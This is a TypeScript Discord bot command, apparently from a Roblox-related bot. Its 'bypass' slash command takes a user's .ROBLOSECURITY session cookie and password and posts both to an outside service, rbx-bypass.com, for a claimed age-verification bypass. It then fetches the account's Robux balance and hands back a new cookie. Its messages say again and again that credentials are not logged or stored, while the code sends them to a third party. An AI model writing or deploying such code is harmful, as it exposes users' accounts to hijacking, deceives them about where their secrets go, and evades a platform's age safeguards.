import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  EmbedBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
} from 'discord.js';
import axios from 'axios';
import { validateCookie } from '../roblox';
import type { Command } from './types';

const bypassStore = new Map<string, string>();

function buildBypassButtons(id: string): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`bypass_copypc_${id}`)
      .setLabel('💻 Copy PC')
      .setStyle(ButtonStyle.Secondary),
    new ButtonBuilder()
      .setCustomId(`bypass_copymob_${id}`)
      .setLabel('📱 Copy Mobile')
      .setStyle(ButtonStyle.Secondary),
  );
}

async function fetchRobux(cookie: string, userId: string): Promise<number> {
  try {
    const resp = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
      validateStatus: () => true,
      timeout: 10000,
    });
    if (resp.status === 200 && resp.data) return resp.data.robux || 0;
  } catch {}
  return 0;
}

const data = new SlashCommandBuilder()
  .setName('bypass')
  .setDescription('Bypass Stuff')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addStringOption(opt =>
    opt.setName('cookie')
      .setDescription('The .ROBLOSECURITY cookie')
      .setRequired(true)
  )
  .addStringOption(opt =>
    opt.setName('password')
      .setDescription('Your Roblox password (we do NOT log or store this)')
      .setRequired(true)
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ ephemeral: true });

    const cookie = interaction.options.getString('cookie', true);
    const password = interaction.options.getString('password', true);
    const timestamp = new Date().toLocaleString();
    const footerData = {
      text: `${interaction.user.username} | ${timestamp}`,
      iconURL: interaction.user.displayAvatarURL(),
    };

    const validation = await validateCookie(cookie);
    if (!validation.valid) {
      const embed = new EmbedBuilder()
        .setTitle('𖣐 Invalid Cookie .ᐟ')
        .setColor('#FFFFFF')
        .setDescription('✧ **Error**\n────\n⭑ The provided cookie is not valid.\n⭑ Your credentials were not logged.')
        .setFooter(footerData);
      await interaction.editReply({ embeds: [embed] });
      return;
    }

    const progressEmbed = new EmbedBuilder()
      .setTitle('𖣐 Processing .ᐟ')
      .setColor('#FFFFFF')
      .setDescription('✧ **Status:** Sending bypass request...\n────\n⭑ Contacting external bypass service.\n⭑ Your credentials are not logged or stored.')
      .setFooter(footerData);

    await interaction.editReply({ embeds: [progressEmbed] });

    const url = 'https://rbx-bypass.com/api/public/bypass';
    const headers = {
      'authority': 'rbx-bypass.com',
      'accept': '*/*',
      'content-type': 'application/json',
      'origin': 'https://rbx-bypass.com',
      'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    };
    const payload = { cookie, password };

    try {
      const resp = await axios.post(url, payload, { headers, timeout: 15000, validateStatus: () => true });
      const data = resp.data;

      if (data.success === true) {
        const msg = data.message || 'No additional info.';
        const newCookie = data.cookie || null;
        let id = '';
        let robux = 0;

        if (newCookie) {
          id = Math.random().toString(36).slice(2, 10);
          bypassStore.set(id, newCookie);
          setTimeout(() => bypassStore.delete(id), 300000);
          const newValidation = await validateCookie(newCookie);
          if (newValidation.valid) {
            robux = await fetchRobux(newCookie, String(newValidation.userId));
          }
        }

        const embed = new EmbedBuilder()
          .setTitle('𖣐 Success .ᐟ')
          .setColor('#FFFFFF')
          .setDescription(
            `✧ **Bypass Result**\n` +
            `────\n` +
            `⭑ **Status:** Success\n` +
            `⭑ **Message:** ${msg}\n` +
            (newCookie ? `⭑ **New Cookie Issued:** Yes\n` : `⭑ **New Cookie Issued:** No\n`) +
            (robux > 0 ? `⭑ **Robux Balance:** ${robux.toLocaleString()} ₽\n` : '') +
            `────\n` +
            `✧ **Details**\n` +
            `────\n` +
            `⭑ **Action:** Age verification bypass attempted.\n` +
            `⭑ **Username:** ${validation.username}\n` +
            `⭑ Your credentials were not logged or stored.`
          )
          .setImage('https://files.catbox.moe/955g15.gif')
          .setFooter(footerData);

        const components = newCookie ? [buildBypassButtons(id)] : [];
        await interaction.editReply({ embeds: [embed], components });
      } else if (data.error === 'BYPASS_IN_PROGRESS') {
        const embed = new EmbedBuilder()
          .setTitle('𖣐 Processing .ᐟ')
          .setColor('#FFFFFF')
          .setDescription(
            '✧ **Status:** Waiting\n' +
            `────\n` +
            `⭑ Your account is being processed.\n` +
            `⭑ Please wait a few minutes and try again.\n` +
            `⭑ Your credentials were not logged or stored.`
          )
          .setFooter(footerData);
        await interaction.editReply({ embeds: [embed] });
      } else {
        const reason = data.message || data.error || 'Unknown error';
        const embed = new EmbedBuilder()
          .setTitle('𖣐 Failed .ᐟ')
          .setColor('#FFFFFF')
          .setDescription(
            `✧ **Error Occurred**\n` +
            `────\n` +
            `⭑ **Reason:** ${reason}\n` +
            `⭑ The bypass request was rejected or failed.\n` +
            `⭑ Your credentials were not logged or stored.`
          )
          .setFooter(footerData);
        await interaction.editReply({ embeds: [embed] });
      }
    } catch (error: any) {
      if (error.code === 'ECONNABORTED' || error.message?.includes('timeout')) {
        const embed = new EmbedBuilder()
          .setTitle('𖣐 Timeout .ᐟ')
          .setColor('#FFFFFF')
          .setDescription(
            '✧ **Status:** Timeout Exceeded\n' +
            `────\n` +
            `⭑ The bypass request timed out.\n` +
            `⭑ Please run the command again to check the status.\n` +
            `⭑ Your credentials were not logged or stored.`
          )
          .setFooter(footerData);
        await interaction.editReply({ embeds: [embed] });
      } else {
        throw error;
      }
    }
  } catch (error: any) {
    const embed = new EmbedBuilder()
      .setTitle('𖣐 Error .ᐟ')
      .setColor('#FFFFFF')
      .setDescription(
        `✧ **Unexpected Error**\n` +
        `────\n` +
        `⭑ ${error.message || 'Something went wrong.'}\n` +
        `⭑ Your credentials were not logged or stored.`
      )
      .setFooter({ text: `${interaction.user.username} | ${new Date().toLocaleString()}`, iconURL: interaction.user.displayAvatarURL() });
    await interaction.editReply({ embeds: [embed] });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  try {
    const customId = interaction.customId;
    if (!customId.startsWith('bypass_')) return;
    const parts = customId.split('_');
    const action = parts[1];
    const id = parts[2];
    const cookie = bypassStore.get(id);
    if (!cookie) {
      await interaction.reply({ content: '𖣐 This button has expired. Please run the command again.', ephemeral: true });
      return;
    }
    if (action === 'copypc') {
      await interaction.reply({ content: `\`\`\`\n${cookie}\n\`\`\``, ephemeral: true });
    } else if (action === 'copymob') {
      await interaction.reply({ content: `\`${cookie}\``, ephemeral: true });
    }
  } catch (error: any) {
    await interaction.reply({ content: `𖣐 Error: ${error.message || 'Something went wrong.'}`, ephemeral: true });
  }
}

export const bypassCommand: Command = { data, execute, handleButton };